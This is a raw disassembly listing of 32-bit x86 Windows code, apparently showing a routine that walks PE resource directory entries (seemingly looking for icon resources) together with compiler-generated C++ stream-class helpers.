  402477:	2b f7                	sub    %edi,%esi
  402479:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  40247c:	e8 7a 05 00 00       	call   0x4029fb
  402481:	8d 45 d8             	lea    -0x28(%ebp),%eax
  402484:	6a 10                	push   $0x10
  402486:	50                   	push   %eax
  402487:	8b cb                	mov    %ebx,%ecx
  402489:	e8 2c 05 00 00       	call   0x4029ba
  40248e:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  402492:	0f b7 4d e6          	movzwl -0x1a(%ebp),%ecx
  402496:	03 c1                	add    %ecx,%eax
  402498:	c1 e0 03             	shl    $0x3,%eax
  40249b:	50                   	push   %eax
  40249c:	e8 aa 14 00 00       	call   0x40394b
  4024a1:	0f b7 55 e6          	movzwl -0x1a(%ebp),%edx
  4024a5:	59                   	pop    %ecx
  4024a6:	89 45 08             	mov    %eax,0x8(%ebp)
  4024a9:	0f b7 4d e4          	movzwl -0x1c(%ebp),%ecx
  4024ad:	03 ca                	add    %edx,%ecx
  4024af:	c1 e1 03             	shl    $0x3,%ecx
  4024b2:	51                   	push   %ecx
  4024b3:	50                   	push   %eax
  4024b4:	8b cb                	mov    %ebx,%ecx
  4024b6:	e8 ff 04 00 00       	call   0x4029ba
  4024bb:	0f b7 4d e4          	movzwl -0x1c(%ebp),%ecx
  4024bf:	0f b7 55 e6          	movzwl -0x1a(%ebp),%edx
  4024c3:	03 ca                	add    %edx,%ecx
  4024c5:	33 c0                	xor    %eax,%eax
  4024c7:	85 c9                	test   %ecx,%ecx
  4024c9:	7e 11                	jle    0x4024dc
  4024cb:	8b 55 08             	mov    0x8(%ebp),%edx
  4024ce:	66 83 3a 03          	cmpw   $0x3,(%edx)
  4024d2:	74 08                	je     0x4024dc
  4024d4:	40                   	inc    %eax
  4024d5:	83 c2 08             	add    $0x8,%edx
  4024d8:	3b c1                	cmp    %ecx,%eax
  4024da:	7c f2                	jl     0x4024ce
  4024dc:	3b c1                	cmp    %ecx,%eax
  4024de:	0f 84 41 01 00 00    	je     0x402625
  4024e4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4024e7:	6a 00                	push   $0x0
  4024e9:	8b 44 c1 04          	mov    0x4(%ecx,%eax,8),%eax
  4024ed:	8b cb                	mov    %ebx,%ecx
  4024ef:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  4024f4:	03 c7                	add    %edi,%eax
  4024f6:	50                   	push   %eax
  4024f7:	e8 ff 04 00 00       	call   0x4029fb
  4024fc:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4024ff:	6a 10                	push   $0x10
  402501:	50                   	push   %eax
  402502:	8b cb                	mov    %ebx,%ecx
  402504:	e8 b1 04 00 00       	call   0x4029ba
  402509:	ff 75 08             	push   0x8(%ebp)
  40250c:	e8 48 14 00 00       	call   0x403959
  402511:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  402515:	0f b7 4d e6          	movzwl -0x1a(%ebp),%ecx
  402519:	03 c1                	add    %ecx,%eax
  40251b:	c1 e0 03             	shl    $0x3,%eax
  40251e:	50                   	push   %eax
  40251f:	e8 27 14 00 00       	call   0x40394b
  402524:	0f b7 55 e6          	movzwl -0x1a(%ebp),%edx
  402528:	59                   	pop    %ecx
  402529:	89 45 08             	mov    %eax,0x8(%ebp)
  40252c:	59                   	pop    %ecx
  40252d:	0f b7 4d e4          	movzwl -0x1c(%ebp),%ecx
  402531:	03 ca                	add    %edx,%ecx
  402533:	c1 e1 03             	shl    $0x3,%ecx
  402536:	51                   	push   %ecx
  402537:	50                   	push   %eax
  402538:	8b cb                	mov    %ebx,%ecx
  40253a:	e8 7b 04 00 00       	call   0x4029ba
  40253f:	0f b7 4d e6          	movzwl -0x1a(%ebp),%ecx
  402543:	33 c0                	xor    %eax,%eax
  402545:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402548:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40254b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40254e:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  402552:	03 c1                	add    %ecx,%eax
  402554:	85 c0                	test   %eax,%eax
  402556:	0f 8e c9 00 00 00    	jle    0x402625
  40255c:	8b 45 08             	mov    0x8(%ebp),%eax
  40255f:	83 c0 04             	add    $0x4,%eax
  402562:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402565:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402568:	6a 00                	push   $0x0
  40256a:	8b cb                	mov    %ebx,%ecx
  40256c:	8b 00                	mov    (%eax),%eax
  40256e:	25 ff ff ff 7f       	and    $0x7fffffff,%eax
  402573:	03 c7                	add    %edi,%eax
  402575:	50                   	push   %eax
  402576:	e8 80 04 00 00       	call   0x4029fb
  40257b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40257e:	6a 10                	push   $0x10
  402580:	50                   	push   %eax
  402581:	8b cb                	mov    %ebx,%ecx
  402583:	e8 32 04 00 00       	call   0x4029ba
  402588:	0f b7 45 bc          	movzwl -0x44(%ebp),%eax
  40258c:	0f b7 4d be          	movzwl -0x42(%ebp),%ecx
  402590:	03 c1                	add    %ecx,%eax
  402592:	c1 e0 03             	shl    $0x3,%eax
  402595:	50                   	push   %eax
  402596:	e8 b0 13 00 00       	call   0x40394b
  40259b:	0f b7 55 be          	movzwl -0x42(%ebp),%edx
  40259f:	59                   	pop    %ecx
  4025a0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4025a3:	0f b7 4d bc          	movzwl -0x44(%ebp),%ecx
  4025a7:	03 ca                	add    %edx,%ecx
  4025a9:	c1 e1 03             	shl    $0x3,%ecx
  4025ac:	51                   	push   %ecx
  4025ad:	50                   	push   %eax
  4025ae:	8b cb                	mov    %ebx,%ecx
  4025b0:	e8 05 04 00 00       	call   0x4029ba
  4025b5:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4025b8:	6a 00                	push   $0x0
  4025ba:	8b cb                	mov    %ebx,%ecx
  4025bc:	8b 40 04             	mov    0x4(%eax),%eax
  4025bf:	03 c7                	add    %edi,%eax
  4025c1:	50                   	push   %eax
  4025c2:	e8 34 04 00 00       	call   0x4029fb
  4025c7:	ff 75 cc             	push   -0x34(%ebp)
  4025ca:	e8 8a 13 00 00       	call   0x403959
  4025cf:	59                   	pop    %ecx
  4025d0:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4025d3:	6a 10                	push   $0x10
  4025d5:	50                   	push   %eax
  4025d6:	8b cb                	mov    %ebx,%ecx
  4025d8:	e8 dd 03 00 00       	call   0x4029ba
  4025dd:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4025e0:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  4025e3:	76 20                	jbe    0x402605
  4025e5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4025e8:	3b 01                	cmp    (%ecx),%eax
  4025ea:	77 19                	ja     0x402605
  4025ec:	8d 75 a0             	lea    -0x60(%ebp),%esi
  4025ef:	8d 7d 90             	lea    -0x70(%ebp),%edi
  4025f2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4025f3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4025f4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4025f5:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4025f8:	8b 45 a0             	mov    -0x60(%ebp),%eax
  4025fb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4025fc:	8b 7d c0             	mov    -0x40(%ebp),%edi
  4025ff:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  402602:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402605:	0f b7 45 e4          	movzwl -0x1c(%ebp),%eax
  402609:	0f b7 4d e6          	movzwl -0x1a(%ebp),%ecx
  40260d:	ff 45 d0             	incl   -0x30(%ebp)
  402610:	83 45 d4 08          	addl   $0x8,-0x2c(%ebp)
  402614:	03 c1                	add    %ecx,%eax
  402616:	39 45 d0             	cmp    %eax,-0x30(%ebp)
  402619:	0f 8c 46 ff ff ff    	jl     0x402565
  40261f:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402623:	75 3c                	jne    0x402661
  402625:	ff 75 08             	push   0x8(%ebp)
  402628:	e8 2c 13 00 00       	call   0x403959
  40262d:	ff 75 e8             	push   -0x18(%ebp)
  402630:	e8 24 13 00 00       	call   0x403959
  402635:	59                   	pop    %ecx
  402636:	59                   	pop    %ecx
  402637:	8b cb                	mov    %ebx,%ecx
  402639:	e8 b7 01 00 00       	call   0x4027f5
  40263e:	33 f6                	xor    %esi,%esi
  402640:	3b de                	cmp    %esi,%ebx
  402642:	74 0f                	je     0x402653
  402644:	8b 03                	mov    (%ebx),%eax
  402646:	6a 01                	push   $0x1
  402648:	8b 40 04             	mov    0x4(%eax),%eax
  40264b:	03 d8                	add    %eax,%ebx
  40264d:	8b cb                	mov    %ebx,%ecx
  40264f:	8b 03                	mov    (%ebx),%eax
  402651:	ff 10                	call   *(%eax)
  402653:	56                   	push   %esi
  402654:	56                   	push   %esi
  402655:	56                   	push   %esi
  402656:	ff 75 0c             	push   0xc(%ebp)
  402659:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40265c:	e9 89 00 00 00       	jmp    0x4026ea
  402661:	ff 75 08             	push   0x8(%ebp)
  402664:	e8 f0 12 00 00       	call   0x403959
  402669:	ff 75 e8             	push   -0x18(%ebp)
  40266c:	e8 e8 12 00 00       	call   0x403959
  402671:	8b 7d f0             	mov    -0x10(%ebp),%edi
  402674:	ff 37                	push   (%edi)
  402676:	e8 d0 12 00 00       	call   0x40394b
  40267b:	89 45 08             	mov    %eax,0x8(%ebp)
  40267e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402681:	83 c4 0c             	add    $0xc,%esp
  402684:	2b c6                	sub    %esi,%eax
  402686:	8b cb                	mov    %ebx,%ecx
  402688:	6a 00                	push   $0x0
  40268a:	50                   	push   %eax
  40268b:	e8 6b 03 00 00       	call   0x4029fb
  402690:	ff 75 ec             	push   -0x14(%ebp)
  402693:	8b cb                	mov    %ebx,%ecx
  402695:	ff 75 08             	push   0x8(%ebp)
  402698:	e8 1d 03 00 00       	call   0x4029ba
  40269d:	8b cb                	mov    %ebx,%ecx
  40269f:	e8 51 01 00 00       	call   0x4027f5
  4026a4:	85 db                	test   %ebx,%ebx
  4026a6:	74 0f                	je     0x4026b7
  4026a8:	8b 03                	mov    (%ebx),%eax
  4026aa:	6a 01                	push   $0x1
  4026ac:	8b 40 04             	mov    0x4(%eax),%eax
  4026af:	03 d8                	add    %eax,%ebx
  4026b1:	8b cb                	mov    %ebx,%ecx
  4026b3:	8b 03                	mov    (%ebx),%eax
  4026b5:	ff 10                	call   *(%eax)
  4026b7:	8d 45 90             	lea    -0x70(%ebp),%eax
  4026ba:	8b cf                	mov    %edi,%ecx
  4026bc:	50                   	push   %eax
  4026bd:	ff 75 08             	push   0x8(%ebp)
  4026c0:	ff 75 ec             	push   -0x14(%ebp)
  4026c3:	ff 75 0c             	push   0xc(%ebp)
  4026c6:	eb 22                	jmp    0x4026ea
  4026c8:	8b cb                	mov    %ebx,%ecx
  4026ca:	e8 26 01 00 00       	call   0x4027f5
  4026cf:	3b df                	cmp    %edi,%ebx
  4026d1:	74 0f                	je     0x4026e2
  4026d3:	8b 03                	mov    (%ebx),%eax
  4026d5:	6a 01                	push   $0x1
  4026d7:	8b 40 04             	mov    0x4(%eax),%eax
  4026da:	03 d8                	add    %eax,%ebx
  4026dc:	8b cb                	mov    %ebx,%ecx
  4026de:	8b 03                	mov    (%ebx),%eax
  4026e0:	ff 10                	call   *(%eax)
  4026e2:	57                   	push   %edi
  4026e3:	57                   	push   %edi
  4026e4:	57                   	push   %edi
  4026e5:	8b ce                	mov    %esi,%ecx
  4026e7:	ff 75 0c             	push   0xc(%ebp)
  4026ea:	e8 e7 f7 ff ff       	call   0x401ed6
  4026ef:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4026f2:	5f                   	pop    %edi
  4026f3:	5e                   	pop    %esi
  4026f4:	5b                   	pop    %ebx
  4026f5:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4026fc:	c9                   	leave
  4026fd:	c2 08 00             	ret    $0x8
  402700:	56                   	push   %esi
  402701:	8d 71 f8             	lea    -0x8(%ecx),%esi
  402704:	57                   	push   %edi
  402705:	8d 7e 08             	lea    0x8(%esi),%edi
  402708:	8b cf                	mov    %edi,%ecx
  40270a:	e8 d3 00 00 00       	call   0x4027e2
  40270f:	8b cf                	mov    %edi,%ecx
  402711:	e8 2a 08 00 00       	call   0x402f40
  402716:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  40271b:	74 07                	je     0x402724
  40271d:	56                   	push   %esi
  40271e:	e8 36 12 00 00       	call   0x403959
  402723:	59                   	pop    %ecx
  402724:	8b c6                	mov    %esi,%eax
  402726:	5f                   	pop    %edi
  402727:	5e                   	pop    %esi
  402728:	c2 04 00             	ret    $0x4
  40272b:	b8 47 81 40 00       	mov    $0x408147,%eax
  402730:	e8 03 16 00 00       	call   0x403d38
  402735:	51                   	push   %ecx
  402736:	51                   	push   %ecx
  402737:	53                   	push   %ebx
  402738:	56                   	push   %esi
  402739:	57                   	push   %edi
  40273a:	33 db                	xor    %ebx,%ebx
  40273c:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  40273f:	8b f1                	mov    %ecx,%esi
  402741:	6a 01                	push   $0x1
  402743:	89 75 ec             	mov    %esi,-0x14(%ebp)
  402746:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402749:	5f                   	pop    %edi
  40274a:	74 14                	je     0x402760
  40274c:	8d 4e 08             	lea    0x8(%esi),%ecx
  40274f:	c7 06 28 91 40 00    	movl   $0x409128,(%esi)
  402755:	e8 98 07 00 00       	call   0x402ef2
  40275a:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40275d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402760:	6a 38                	push   $0x38
  402762:	e8 e4 11 00 00       	call   0x40394b
  402767:	59                   	pop    %ecx
  402768:	8b c8                	mov    %eax,%ecx
  40276a:	89 4d 14             	mov    %ecx,0x14(%ebp)
  40276d:	3b cb                	cmp    %ebx,%ecx
  40276f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402772:	74 07                	je     0x40277b
  402774:	e8 e2 02 00 00       	call   0x402a5b
  402779:	eb 02                	jmp    0x40277d
  40277b:	33 c0                	xor    %eax,%eax
  40277d:	53                   	push   %ebx
  40277e:	50                   	push   %eax
  40277f:	8b ce                	mov    %esi,%ecx
  402781:	88 5d fc             	mov    %bl,-0x4(%ebp)
  402784:	e8 0b 09 00 00       	call   0x403094
  402789:	8b 06                	mov    (%esi),%eax
  40278b:	6a 02                	push   $0x2
  40278d:	5b                   	pop    %ebx
  40278e:	8b 40 04             	mov    0x4(%eax),%eax
  402791:	ff 75 10             	push   0x10(%ebp)
  402794:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402797:	c7 04 30 24 91 40 00 	movl   $0x409124,(%eax,%esi,1)
  40279e:	8b 06                	mov    (%esi),%eax
  4027a0:	8b 40 04             	mov    0x4(%eax),%eax
  4027a3:	89 7c 30 1c          	mov    %edi,0x1c(%eax,%esi,1)
  4027a7:	8b 06                	mov    (%esi),%eax
  4027a9:	8b 40 04             	mov    0x4(%eax),%eax
  4027ac:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  4027b0:	8b 45 0c             	mov    0xc(%ebp),%eax
  4027b3:	0b c3                	or     %ebx,%eax
  4027b5:	50                   	push   %eax
  4027b6:	ff 75 08             	push   0x8(%ebp)
  4027b9:	e8 4a 09 00 00       	call   0x403108
  4027be:	85 c0                	test   %eax,%eax
  4027c0:	75 0d                	jne    0x4027cf
  4027c2:	8b 06                	mov    (%esi),%eax
  4027c4:	8b 40 04             	mov    0x4(%eax),%eax
  4027c7:	09 5c 30 08          	or     %ebx,0x8(%eax,%esi,1)
  4027cb:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  4027cf:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4027d2:	8b c6                	mov    %esi,%eax
  4027d4:	5f                   	pop    %edi
  4027d5:	5e                   	pop    %esi
  4027d6:	5b                   	pop    %ebx
  4027d7:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4027de:	c9                   	leave
  4027df:	c2 10 00             	ret    $0x10
  4027e2:	8b 41 f8             	mov    -0x8(%ecx),%eax
  4027e5:	8b 40 04             	mov    0x4(%eax),%eax
  4027e8:	c7 44 08 f8 24 91 40 	movl   $0x409124,-0x8(%eax,%ecx,1)
  4027ef:	00 
  4027f0:	e9 04 09 00 00       	jmp    0x4030f9
  4027f5:	56                   	push   %esi
  4027f6:	8b f1                	mov    %ecx,%esi
  4027f8:	8b 06                	mov    (%esi),%eax
  4027fa:	8b 40 04             	mov    0x4(%eax),%eax
  4027fd:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402801:	e8 d0 02 00 00       	call   0x402ad6
  402806:	85 c0                	test   %eax,%eax
  402808:	74 04                	je     0x40280e
  40280a:	33 c0                	xor    %eax,%eax
  40280c:	eb 0b                	jmp    0x402819
  40280e:	8b 06                	mov    (%esi),%eax
  402810:	8b 40 04             	mov    0x4(%eax),%eax
  402813:	8b 44 30 08          	mov    0x8(%eax,%esi,1),%eax
  402817:	0c 02                	or     $0x2,%al
  402819:	8b 0e                	mov    (%esi),%ecx
  40281b:	8b 49 04             	mov    0x4(%ecx),%ecx
  40281e:	89 44 31 08          	mov    %eax,0x8(%ecx,%esi,1)
  402822:	5e                   	pop    %esi
  402823:	c3                   	ret
  402824:	56                   	push   %esi
  402825:	8d 71 f4             	lea    -0xc(%ecx),%esi
  402828:	57                   	push   %edi
  402829:	8d 7e 0c             	lea    0xc(%esi),%edi
  40282c:	8b cf                	mov    %edi,%ecx
  40282e:	e8 d3 00 00 00       	call   0x402906
  402833:	8b cf                	mov    %edi,%ecx
  402835:	e8 06 07 00 00       	call   0x402f40
  40283a:	f6 44 24 0c 01       	testb  $0x1,0xc(%esp)
  40283f:	74 07                	je     0x402848
  402841:	56                   	push   %esi
  402842:	e8 12 11 00 00       	call   0x403959
  402847:	59                   	pop    %ecx
  402848:	8b c6                	mov    %esi,%eax
  40284a:	5f                   	pop    %edi
  40284b:	5e                   	pop    %esi
  40284c:	c2 04 00             	ret    $0x4
  40284f:	b8 83 81 40 00       	mov    $0x408183,%eax
  402854:	e8 df 14 00 00       	call   0x403d38
  402859:	51                   	push   %ecx
  40285a:	51                   	push   %ecx
  40285b:	53                   	push   %ebx
  40285c:	56                   	push   %esi
  40285d:	57                   	push   %edi
  40285e:	33 db                	xor    %ebx,%ebx
  402860:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  402863:	8b f1                	mov    %ecx,%esi
  402865:	6a 01                	push   $0x1
  402867:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40286a:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40286d:	5f                   	pop    %edi
  40286e:	74 14                	je     0x402884
  402870:	8d 4e 0c             	lea    0xc(%esi),%ecx
  402873:	c7 06 38 91 40 00    	movl   $0x409138,(%esi)
  402879:	e8 74 06 00 00       	call   0x402ef2
  40287e:	89 7d f0             	mov    %edi,-0x10(%ebp)
  402881:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402884:	6a 38                	push   $0x38
  402886:	e8 c0 10 00 00       	call   0x40394b
  40288b:	59                   	pop    %ecx
  40288c:	8b c8                	mov    %eax,%ecx
  40288e:	89 4d 14             	mov    %ecx,0x14(%ebp)
  402891:	3b cb                	cmp    %ebx,%ecx
  402893:	89 7d fc             	mov    %edi,-0x4(%ebp)
  402896:	74 07                	je     0x40289f
  402898:	e8 be 01 00 00       	call   0x402a5b
  40289d:	eb 02                	jmp    0x4028a1
  40289f:	33 c0                	xor    %eax,%eax
  4028a1:	53                   	push   %ebx
  4028a2:	50                   	push   %eax
  4028a3:	8b ce                	mov    %esi,%ecx
  4028a5:	88 5d fc             	mov    %bl,-0x4(%ebp)
  4028a8:	e8 cf 09 00 00       	call   0x40327c
  4028ad:	8b 06                	mov    (%esi),%eax
  4028af:	6a 02                	push   $0x2
  4028b1:	5b                   	pop    %ebx
  4028b2:	8b 40 04             	mov    0x4(%eax),%eax
  4028b5:	ff 75 10             	push   0x10(%ebp)
  4028b8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4028bb:	c7 04 30 34 91 40 00 	movl   $0x409134,(%eax,%esi,1)
  4028c2:	8b 06                	mov    (%esi),%eax
  4028c4:	8b 40 04             	mov    0x4(%eax),%eax
  4028c7:	89 7c 30 1c          	mov    %edi,0x1c(%eax,%esi,1)
  4028cb:	8b 06                	mov    (%esi),%eax
  4028cd:	8b 40 04             	mov    0x4(%eax),%eax
  4028d0:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  4028d4:	8b 45 0c             	mov    0xc(%ebp),%eax
  4028d7:	0b c7                	or     %edi,%eax
  4028d9:	50                   	push   %eax
  4028da:	ff 75 08             	push   0x8(%ebp)
  4028dd:	e8 26 08 00 00       	call   0x403108
  4028e2:	85 c0                	test   %eax,%eax
  4028e4:	75 0d                	jne    0x4028f3
  4028e6:	8b 06                	mov    (%esi),%eax
  4028e8:	8b 40 04             	mov    0x4(%eax),%eax
  4028eb:	09 5c 30 08          	or     %ebx,0x8(%eax,%esi,1)
  4028ef:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  4028f3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4028f6:	8b c6                	mov    %esi,%eax
  4028f8:	5f                   	pop    %edi
  4028f9:	5e                   	pop    %esi
  4028fa:	5b                   	pop    %ebx
  4028fb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  402902:	c9                   	leave
  402903:	c2 10 00             	ret    $0x10
  402906:	8b 41 f4             	mov    -0xc(%ecx),%eax
  402909:	8b 40 04             	mov    0x4(%eax),%eax
  40290c:	c7 44 08 f4 34 91 40 	movl   $0x409134,-0xc(%eax,%ecx,1)
  402913:	00 
  402914:	e9 d9 09 00 00       	jmp    0x4032f2
  402919:	56                   	push   %esi
  40291a:	8b f1                	mov    %ecx,%esi
  40291c:	8b 06                	mov    (%esi),%eax
  40291e:	8b 40 04             	mov    0x4(%eax),%eax
  402921:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402925:	83 79 30 ff          	cmpl   $0xffffffff,0x30(%ecx)
  402929:	75 18                	jne    0x402943
  40292b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40292f:	ff 74 24 10          	push   0x10(%esp)
  402933:	0c 01                	or     $0x1,%al
  402935:	50                   	push   %eax
  402936:	ff 74 24 10          	push   0x10(%esp)
  40293a:	e8 c9 07 00 00       	call   0x403108
  40293f:	85 c0                	test   %eax,%eax
  402941:	75 0e                	jne    0x402951
  402943:	8b 06                	mov    (%esi),%eax
  402945:	8b 40 04             	mov    0x4(%eax),%eax
  402948:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  40294d:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  402951:	5e                   	pop    %esi
  402952:	c2 0c 00             	ret    $0xc
  402955:	8b 41 1c             	mov    0x1c(%ecx),%eax
  402958:	3b 41 20             	cmp    0x20(%ecx),%eax
  40295b:	73 0e                	jae    0x40296b
  40295d:	8a 54 24 04          	mov    0x4(%esp),%dl
  402961:	88 10                	mov    %dl,(%eax)
  402963:	ff 41 1c             	incl   0x1c(%ecx)
  402966:	0f b6 c2             	movzbl %dl,%eax
  402969:	eb 09                	jmp    0x402974
  40296b:	8b 01                	mov    (%ecx),%eax
  40296d:	ff 74 24 04          	push   0x4(%esp)
  402971:	ff 50 1c             	call   *0x1c(%eax)
  402974:	c2 04 00             	ret    $0x4
  402977:	56                   	push   %esi
  402978:	8b f1                	mov    %ecx,%esi
  40297a:	e8 19 06 00 00       	call   0x402f98
  40297f:	85 c0                	test   %eax,%eax
  402981:	74 31                	je     0x4029b4
  402983:	8b 06                	mov    (%esi),%eax
  402985:	ff 74 24 0c          	push   0xc(%esp)
  402989:	8b 40 04             	mov    0x4(%eax),%eax
  40298c:	ff 74 24 0c          	push   0xc(%esp)
  402990:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402994:	8b 01                	mov    (%ecx),%eax
  402996:	ff 50 14             	call   *0x14(%eax)
  402999:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  40299d:	74 0e                	je     0x4029ad
  40299f:	8b 06                	mov    (%esi),%eax
  4029a1:	8b 40 04             	mov    0x4(%eax),%eax
  4029a4:	83 4c 30 08 06       	orl    $0x6,0x8(%eax,%esi,1)
  4029a9:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  4029ad:	8b ce                	mov    %esi,%ecx
  4029af:	e8 0d 06 00 00       	call   0x402fc1
  4029b4:	8b c6                	mov    %esi,%eax
  4029b6:	5e                   	pop    %esi
  4029b7:	c2 08 00             	ret    $0x8
  4029ba:	56                   	push   %esi
  4029bb:	8b f1                	mov    %ecx,%esi
  4029bd:	6a 01                	push   $0x1
  4029bf:	e8 3d 09 00 00       	call   0x403301
  4029c4:	85 c0                	test   %eax,%eax
  4029c6:	74 2d                	je     0x4029f5
  4029c8:	8b 06                	mov    (%esi),%eax
  4029ca:	ff 74 24 0c          	push   0xc(%esp)
  4029ce:	8b 40 04             	mov    0x4(%eax),%eax
  4029d1:	ff 74 24 0c          	push   0xc(%esp)
  4029d5:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  4029d9:	8b 01                	mov    (%ecx),%eax
  4029db:	ff 50 18             	call   *0x18(%eax)
  4029de:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4029e2:	89 46 08             	mov    %eax,0x8(%esi)
  4029e5:	73 0e                	jae    0x4029f5
  4029e7:	8b 06                	mov    (%esi),%eax
  4029e9:	8b 40 04             	mov    0x4(%eax),%eax
  4029ec:	83 4c 30 08 03       	orl    $0x3,0x8(%eax,%esi,1)
  4029f1:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  4029f5:	8b c6                	mov    %esi,%eax
  4029f7:	5e                   	pop    %esi
  4029f8:	c2 08 00             	ret    $0x8
  4029fb:	56                   	push   %esi
  4029fc:	8b f1                	mov    %ecx,%esi
  4029fe:	6a 01                	push   $0x1
  402a00:	8b 06                	mov    (%esi),%eax
  402a02:	ff 74 24 10          	push   0x10(%esp)
  402a06:	8b 40 04             	mov    0x4(%eax),%eax
  402a09:	ff 74 24 10          	push   0x10(%esp)
  402a0d:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402a11:	8b 01                	mov    (%ecx),%eax
  402a13:	ff 50 0c             	call   *0xc(%eax)
  402a16:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a19:	75 0e                	jne    0x402a29
  402a1b:	8b 06                	mov    (%esi),%eax
  402a1d:	8b 40 04             	mov    0x4(%eax),%eax
  402a20:	83 4c 30 08 02       	orl    $0x2,0x8(%eax,%esi,1)
  402a25:	8d 44 30 08          	lea    0x8(%eax,%esi,1),%eax
  402a29:	8b c6                	mov    %esi,%eax
  402a2b:	5e                   	pop    %esi
  402a2c:	c2 08 00             	ret    $0x8
  402a2f:	56                   	push   %esi
  402a30:	8b f1                	mov    %ecx,%esi
  402a32:	6a 01                	push   $0x1
  402a34:	6a 01                	push   $0x1
  402a36:	8b 06                	mov    (%esi),%eax
  402a38:	6a 00                	push   $0x0
  402a3a:	8b 40 04             	mov    0x4(%eax),%eax
  402a3d:	8b 4c 30 04          	mov    0x4(%eax,%esi,1),%ecx
  402a41:	8b 01                	mov    (%ecx),%eax
  402a43:	ff 50 0c             	call   *0xc(%eax)
  402a46:	83 f8 ff             	cmp    $0xffffffff,%eax
  402a49:	75 0e                	jne    0x402a59
  402a4b:	8b 0e                	mov    (%esi),%ecx
  402a4d:	8b 49 04             	mov    0x4(%ecx),%ecx
  402a50:	83 4c 31 08 02       	orl    $0x2,0x8(%ecx,%esi,1)
  402a55:	8d 4c 31 08          	lea    0x8(%ecx,%esi,1),%ecx
  402a59:	5e                   	pop    %esi
  402a5a:	c3                   	ret
  402a5b:	56                   	push   %esi
  402a5c:	8b f1                	mov    %ecx,%esi
  402a5e:	e8 f7 09 00 00       	call   0x40345a
  402a63:	83 66 34 00          	andl   $0x0,0x34(%esi)
  402a67:	83 4e 30 ff          	orl    $0xffffffff,0x30(%esi)
  402a6b:	c7 06 5c 91 40 00    	movl   $0x40915c,(%esi)
  402a71:	8b c6                	mov    %esi,%eax
  402a73:	5e                   	pop    %esi
  402a74:	c3                   	ret
  402a75:	56                   	push   %esi
  402a76:	8b f1                	mov    %ecx,%esi
  402a78:	e8 14 00 00 00       	call   0x402a91
  402a7d:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402a82:	74 07                	je     0x402a8b
  402a84:	56                   	push   %esi
  402a85:	e8 cf 0e 00 00       	call   0x403959
  402a8a:	59                   	pop    %ecx
  402a8b:	8b c6                	mov    %esi,%eax
  402a8d:	5e                   	pop    %esi
  402a8e:	c2 04 00             	ret    $0x4
  402a91:	b8 98 81 40 00       	mov    $0x408198,%eax
  402a96:	e8 9d 12 00 00       	call   0x403d38
  402a9b:	51                   	push   %ecx
  402a9c:	56                   	push   %esi
  402a9d:	8b f1                	mov    %ecx,%esi
  402a9f:	89 75 f0             	mov    %esi,-0x10(%ebp)
  402aa2:	c7 06 5c 91 40 00    	movl   $0x40915c,(%esi)
  402aa8:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
